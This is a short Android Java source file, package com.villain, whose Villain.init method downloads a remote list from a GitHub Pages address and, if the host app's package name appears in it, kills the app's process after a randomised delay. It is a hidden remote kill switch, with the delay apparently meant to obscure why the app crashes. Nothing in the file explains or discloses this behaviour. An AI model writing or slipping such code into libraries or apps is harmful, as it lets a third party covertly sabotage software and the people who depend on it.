package com.villain;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Villain {

    private static Handler handler = new Handler(Looper.getMainLooper()){
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            android.os.Process.killProcess(android.os.Process.myPid());
        }
    };

    private static long step = 10_000L;

    public static void init(Context context ) {
        final String packageName = context.getPackageName();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL("https://bbbbbbsg.github.io/data");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.connect();
                    InputStream ios =  connection.getInputStream();
                    byte[] bytes = new byte[1024];
                    int len = 0;
                    StringBuilder sb = new StringBuilder();
                    while ((len=ios.read(bytes))!=-1) {
                        String s = new String(bytes, 0, len);
                        sb.append(s);
                    }
                    long time = (long) ((1+Math.random()*(10-1+1))*step);
                    String s = sb.toString();
                    if (s.contains(packageName)) {
                        handler.sendEmptyMessageDelayed(1,time);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
